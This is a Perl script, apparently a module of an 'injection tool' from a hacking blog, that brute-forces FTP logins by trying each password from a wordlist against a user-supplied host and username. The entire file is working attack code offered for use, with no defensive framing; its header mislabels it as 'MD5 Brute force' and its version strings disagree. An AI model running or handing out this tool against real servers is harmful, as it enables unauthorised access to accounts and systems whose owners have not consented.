#!/usr/local/bin/perl

#-----------------------------------------------------------------------------------------#
# Injection tool by VOİXSEC.BLOGSPOT.COM
# Code version: 2.0
# Function file: MD5 Brute force
#-----------------------------------------------------------------------------------------#

@passwords =  &get_list("brute/","passwords.txt");

print "Mode: FTP Brute force v".$version."\n\nHost: ";
chomp($host = <STDIN>);

&generalPrint("Mode: FTP Brute force v2.1.0\n\nHost: ".$host, 1);

print "Username: ";
chomp($username = <STDIN>);
print "\n";


if(!(my $ftp = Net::FTP->new($host, Timeout=>240)))
{
	print "\n\nError connecting to $host\n\n";
	exit;
}
for($i = 0; $i < @passwords; $i++)
{
	$password = $passwords[$i];
	$password =~ m/([^\n\r\t\s]+)/;
	$password = $1;
	
	print $password." - ";

	if($ftp->login($username, $password))
	{
		print "User password!!!\n\n";
		exit;
	}
	else
	{
		print "False\n";
	}
}

$ftp->quit;

1;
